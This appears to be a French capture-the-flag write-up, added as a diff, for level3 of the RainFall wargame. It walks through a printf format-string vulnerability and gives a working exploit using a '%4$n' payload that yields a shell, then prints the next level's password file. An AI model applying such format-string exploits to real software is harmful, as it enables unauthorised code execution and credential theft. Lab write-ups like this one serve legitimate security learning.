@@ -1,0 +1,41 @@
+On teste le binaire pour savoir ce qu'il fait, il ouvre un stream puis print deux fois dans la sortie standare le param mis dans le stream
+
+Voir le disas dans disas_analys
+
+Ici on peut voir que si eax == 64 on rentre dans l'autre parti du code qui ouvre un sh
+
+on test
+
+level3@RainFall:~$ ./level3
+64
+64
+level3@RainFall:~$
+
+Ca marche pas donc relecture plus reflexion.
+
+Ok on remarque que printf prend simplement un const char*
+
+On test donc test un param qui s'apparente a un format qui pourrai etre utilise sur print comme %s par exemple
+
+level3@RainFall:~$ ./level3
+%s
+Segmentation fault (core dumped)
+
+On a un segfault. En faisant des recherche sur les vulerabilite de printf on remarque si prinft prend une string sans avoir un format de specifier peut ouvrir a des d'overflow. En effet si le format n'ai pas specifier en lui donnant un format comme %n on peut lui renvoyer une adresse memoire.
+
+Dans notre cas le const char* est present mais pas le format donc c'est pour ca que ca que si on mettait 64 ca marchait et si on mettait un format seul sa segfaulted.
+
+Donc en recuperant l'adresse de la comparaison du 64 0x804988c et en y attribuant 60 byte, plus le %n on devrait pouvoir arrive a quelque chose.
+
+
+python -c 'print "\x8c\x98\x04\x08" + "o" * 60 + "%4$n"' > /tmp/run ; le %4$n c'est pour inclure l'adresse et comme c'est de l'hexa ca vos 4 bytes
+
+level3@RainFall:~$ cat /tmp/run - | ./level3
+�oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
+Wait what?!
+whoami
+level4
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+
+et voila
